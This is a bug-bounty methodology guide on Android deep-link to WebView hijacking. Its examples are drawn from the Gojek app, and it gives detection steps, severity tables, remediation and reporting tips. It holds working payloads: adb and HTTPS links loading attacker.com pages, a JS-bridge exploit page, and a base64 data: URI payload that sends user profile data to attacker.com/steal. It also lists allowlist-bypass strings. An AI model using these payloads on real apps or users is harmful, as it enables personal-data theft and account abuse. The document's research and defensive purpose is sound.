# Deep Link → WebView Hijack Pattern

## Overview

A common critical vulnerability in Android apps where deep link handlers load attacker-controlled URLs in WebViews with JavaScript bridges exposed. The attack chain:

```
Attacker link → DeeplinkActivity (exported) → WebView.loadUrl(attacker_url) → JS bridge accessible
```

## Detection (Static Analysis)

### Step 1: Find deep link handlers
```bash
# Search for @DeepLink annotations
grep -rn "@DeepLink" sources/com/<package>/ | grep -i "web\|url"

# Search for intent-filter with BROWSABLE category in manifest
grep -B5 -A10 "BROWSABLE" resources/AndroidManifest.xml
```

### Step 2: Check URL validation
Look for the handler method. Vulnerable pattern:
```java
// VULNERABLE - no validation
String url = bundle.getString("url");
webView.loadUrl(url);

// SAFE - whitelist check
String url = bundle.getString("url");
if (isAllowedDomain(url)) {
    webView.loadUrl(url);
}
```

### Step 3: Check for JavaScript bridges
```bash
grep -rn "addJavascriptInterface" sources/com/<package>/
```

If the WebView that loads the unvalidated URL also has `addJavascriptInterface`, it's Critical.

### Step 4: Map all entry points
A single vulnerable handler may have multiple deep link routes:
```java
@DeepLink({"gojek://gocore/web", "gojek://gocore/third_party_web"})
// Same handler, multiple entry points
```

Also check if other handlers delegate to the same vulnerable function:
```java
@DeepLink({"gojek://gosend/web"})
public static TaskStackBuilder handleWebDeepLink(Context p0, Bundle p1) {
    // Delegates to the same vulnerable handler!
    return ThirdPartyProductDeeplinkHandlerKt.handleThirdPartyWebDeeplink(p0, p1);
}
```

### Step 5: Check HTTPS app link conversion
Many apps convert HTTPS app links to internal deep links:
```java
// https://gojek.link/gocore/web?url=X → gojek://gocore/web?url=X
// This means attacker can use a legitimate-looking HTTPS URL
```

## Exploitation

### Via ADB (testing)
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "gojek://gocore/web?url=https://attacker.com/exploit.html&title=Legit%20Title"
```

### Via HTTPS link (real attack)
```
https://gojek.link/gocore/web?url=https://attacker.com/phish&title=GoPay%20Login
```

### Exploit page (JS bridge abuse)
```html
<html>
<body>
<script>
// Enumerate bridge methods
for (var method in OneKycAndroidInterface) {
    document.write(method + "<br>");
}

// Call sensitive methods
OneKycAndroidInterface.getOneKycUserDetails("param1", "param2", "callback");
OneKycAndroidInterface.getOneKycStatus("param1", "param2", "callback");
</script>
</body>
</html>
```

## Impact Escalation

| JS Bridge Method Type | Impact |
|---|---|
| getData/getStatus | PII theft, account info disclosure |
| submitConsent/initiateConsent | Consent manipulation, unauthorized agreements |
| launchKyc/launchChallenge | Trigger verification flows with attacker params |
| launchFRChallenge | Trigger facial recognition under false pretenses |
| executeCommand/eval | RCE |

## Severity Assessment

| Condition | Severity |
|---|---|
| No URL validation + JS bridge with sensitive methods | Critical |
| No URL validation + JS bridge with non-sensitive methods | High |
| No URL validation + no JS bridge (phishing only) | Medium-High |
| Weak validation (bypassable regex) + JS bridge | High |
| No handler validation + server-side allowlist (SecureWebView) | Medium (downgrade from Critical) |
| No handler validation + server-side allowlist + scheme bypass (data: URI) | Critical (allowlist bypassed) |
| No handler validation + server-side allowlist + open redirect on allowed domain | High-Critical (allowlist bypassed) |
| No handler validation + server-side allowlist + `allowAllAccess=true` partner | Critical (allowlist irrelevant) |
| Proper domain whitelist (client-side, hardcoded) + JS bridge | Low (if whitelist is correct) |

## data: URI Scheme Bypass (Allowlist Evasion)

### Discovery (Gojek, 2026-05)

When a `SecureWebView` checks the URL scheme against a set like `{http, https}` to decide whether to enforce the domain allowlist, **any non-http/https scheme bypasses the check entirely**. The `data:` URI scheme is the most useful because it allows inline HTML+JS execution.

### How it works

Typical allowlist check pattern:
```java
// SecureWebView ViewModel
private static final Set<String> ALLOWED_SCHEMES = Set.of("https", "http");

// URL load gate
private boolean isUrlAllowed(String host, String scheme) {
    // If scheme is NOT http/https → skip domain check → ALLOW
    return !ALLOWED_SCHEMES.contains(scheme) || domainWhitelist.contains(host);
}

// JS bridge gate (same logic)
public boolean shouldAddBridge(String url) {
    String scheme = Uri.parse(url).getScheme();
    // If scheme is NOT http/https → condition is false → returns true → BRIDGE ADDED
    return (ALLOWED_SCHEMES.contains(scheme) && !bridgeWhitelist.contains(host) && featureFlag) ? false : true;
}
```

For a `data:` URI:
- `Uri.parse("data:text/html,...").getScheme()` → `"data"`
- `"data"` is NOT in `{http, https}`
- Domain check is SKIPPED
- URL loads AND JS bridge is added

### Attack payload

```
gojek://gocore/web?url=data:text/html;base64,PGh0bWw+PHNjcmlwdD52YXIgZD1PbmVLeWNBbmRyb2lkSW50ZXJmYWNlLmdldFVzZXJQcm9maWxlKCk7bmV3IEltYWdlKCkuc3JjPSdodHRwczovL2F0dGFja2VyLmNvbS9zdGVhbD9kYXRhPScrZW5jb2RlVVJJQ29tcG9uZW50KGQpOzwvc2NyaXB0PjwvaHRtbD4=
```

Decoded:
```html
<html><script>
var d=OneKycAndroidInterface.getUserProfile();
new Image().src='https://attacker.com/steal?data='+encodeURIComponent(d);
</script></html>
```

### External delivery via HTTPS app link
```
https://gojek.link/gocore/web?url=data:text/html;base64,[PAYLOAD]
```

### Other bypass schemes to try

| Scheme | Behavior | Notes |
|--------|----------|-------|
| `data:text/html;base64,...` | Inline HTML+JS | Best — full control, no network needed |
| `javascript:...` | Execute JS directly | Often blocked by WebView itself (Android 4.4+) |
| `file:///sdcard/...` | Load local file | Requires file on device, `setAllowFileAccess(true)` |
| `content://...` | Load from ContentProvider | Requires exported provider with HTML content |
| `blob:...` | Blob URL | Only works if created in same WebView context |
| `about:blank` | Empty page | Useful for testing if non-http schemes load |

### Detection in static analysis

```bash
# Find the scheme check set
grep -rn "Set.of\|setOf\|hashSetOf" sources/ | grep -i "http"
grep -rn "contains.*scheme\|scheme.*contains" sources/

# Find the conditional that gates loadUrl
grep -rn "super.loadUrl" sources/ | head -5
# Then read the surrounding if/else to see what condition gates it

# Confirm data: URIs aren't explicitly blocked
grep -rn "data:\|javascript:\|file:" sources/ | grep -i "block\|deny\|reject\|invalid"
```

### Why this is Critical (not Medium)

- The domain allowlist is the ONLY defense between the deep link and the JS bridge
- The bypass is deterministic (not timing-dependent, not race-condition)
- Works on any non-rooted device with the app installed
- Delivered via standard HTTPS link (WhatsApp, SMS, email)
- No user interaction beyond tapping the link
- Full JS bridge access = same impact as no allowlist at all

### Remediation

1. **Block non-http/https schemes:** Add `data`, `javascript`, `file`, `content`, `blob` to the blocked set
2. **Default-deny:** Only allow `https://` URLs that pass the domain check; reject everything else
3. **Validate in the handler:** Don't rely solely on the WebView — validate URL scheme and domain in the deep link handler before launching the activity
4. **Remove bridge for non-allowlisted:** Default to NOT adding the JS bridge; only add it for explicitly allowlisted domains

## Server-Side Domain Allowlist Architecture (SecureWebView Pattern)

Modern apps (Gojek, banking apps) implement a **layered defense** where the deep link handler has no validation, but the WebView itself enforces a server-fetched domain allowlist:

```
Deep link handler (NO validation) → ThirdPartyWebActivity → SecureWebView.loadUrl()
                                                                    ↓
                                                          ViewModel.isAllowed(url)
                                                                    ↓
                                                    Check host against DOMAIN_WHITELIST_BATCH_*
                                                                    ↓
                                              ┌─────────────────────┴─────────────────────┐
                                              ↓                                           ↓
                                    Host IN allowlist                            Host NOT in allowlist
                                              ↓                                           ↓
                                    Check JS_BRIDGE_WHITELIST                    Block load, show error
                                              ↓                                  ("you don't have access")
                                    ┌─────────┴─────────┐
                                    ↓                   ↓
                            In bridge list       Not in bridge list
                                    ↓                   ↓
                        addJavascriptInterface    removeJavascriptInterface
                                    ↓                   ↓
                            Bridge accessible     Page loads but no bridge
```

### Key characteristics:
- **Two separate allowlists:** `DOMAIN_WHITELIST` (can URL load at all?) and `JS_BRIDGE_WHITELIST` (does URL get the JS bridge?)
- **Server-fetched:** Stored in batches (`DOMAIN_WHITELIST_BATCH_0`, `BATCH_1`, etc.) from remote config
- **Feature flags control enforcement:** If the feature flag is OFF, all URLs load (fail-open)
- **Host normalization:** Strips `www.` prefix, lowercases before comparison
- **Scheme-based gating:** Only enforces allowlist for `http`/`https` — other schemes bypass (see data: URI bypass above)

### Implications for severity:
- Deep link handler with no validation + server-side allowlist = **Medium** (not Critical)
- UNLESS the allowlist is bypassable (data: URI, open redirect, etc.) → then **Critical**
- The allowlist is a defense-in-depth control that blocks arbitrary URL loading
- However, the deep link handler IS still vulnerable — the allowlist is a separate control

### Bypass strategies for server-side allowlists:

1. **data: URI scheme bypass (PROVEN):** Use `data:text/html;base64,...` — scheme check only blocks http/https, so data: bypasses both the load gate AND the bridge gate. This is the most reliable bypass.
2. **Open redirect on an allowed domain:** If `*.gojek.com` is allowlisted and has an open redirect, chain: `gojek://gocore/web?url=https://gojek.com/redirect?to=https://attacker.com`
3. **Subdomain takeover:** If `partner.gojek.com` is allowlisted but has dangling DNS, take it over
4. **Partner domain compromise:** Allowed third-party domains may have weaker security
5. **Feature flag manipulation:** If the enforcement flag can be toggled (e.g., via Firebase Remote Config), disabling it removes the allowlist
6. **Empty allowlist fallback:** Some implementations return `false` (allow all) when the allowlist is empty or fetch fails — check the code path for `arrayList.isEmpty()` → what does it return?
7. **Config endpoint interception:** If the allowlist is fetched over HTTP or with weak pinning, MITM can inject attacker domains
8. **`allowAllAccess` flag:** Some `PartnerConfig` objects have `allowAllAccess=true` — find which partners have this and use their deep link routes

### How to identify this pattern in static analysis:
```bash
# Look for SecureWebView or custom WebView subclass with loadUrl override
grep -rn "extends WebView" sources/ | grep -v "android.webkit"
grep -rn "super.loadUrl" sources/  # Custom loadUrl that gates the call

# Look for domain whitelist config
grep -rn "DOMAIN_WHITELIST\|allowedHostNames\|allowedDomains\|js_bridge.*whitelist" sources/

# Look for the ViewModel/checker that validates URLs
grep -rn "isAllowed\|isHostAllowed\|checkDomain\|Uri.parse.*getHost" sources/

# Look for scheme set (the bypass target)
grep -rn "Set.of.*http\|setOf.*http\|hashSetOf.*http" sources/
grep -rn "contains.*getScheme\|getScheme.*contains" sources/
```

### Reporting when allowlist blocks exploitation:
- Report the deep link handler vulnerability (no URL validation) as the primary finding
- Note the server-side allowlist as a mitigating control
- Check for data: URI bypass FIRST — if it works, the finding is Critical regardless of allowlist
- Explain that the allowlist is a defense-in-depth measure, not a fix for the root cause
- Suggest fixing at the handler level (validate URL before passing to WebView)
- Note bypass potential (data: URI, open redirects, partner domains, config manipulation)

## Common Bypasses for URL Validation

When validation exists, try:
- `data:text/html;base64,...` (scheme bypass — most reliable for allowlist evasion)
- `https://trusted.com@attacker.com` (URL authority confusion)
- `https://trusted.com.attacker.com` (subdomain confusion)
- `https://attacker.com/redirect?to=https://trusted.com` (open redirect chain)
- `javascript:alert(1)//https://trusted.com` (scheme confusion)
- URL encoding: `%6A%61%76%61%73%63%72%69%70%74:` for `javascript:`
- Null byte: `https://trusted.com%00.attacker.com`

## Bug Bounty Reporting Tips

- Static code evidence is sufficient — you don't need dynamic PoC if the code path is clear
- Show the full chain: entry point → handler → no validation → WebView → bridge
- Include the HTTPS app link variant (makes it more realistic as an attack)
- List all affected deep link routes (shows broader impact)
- Map all JS bridge methods with their potential impact
- Mention that the attack works on any non-rooted device with the app installed
- For data: URI bypass: show the decompiled scheme check, explain why data: passes, provide the base64 payload
- When DexGuard/root detection blocks dynamic testing, explicitly state: "Dynamic validation blocked by anti-tampering; code path analysis confirms deterministic exploitation on unmodified devices"
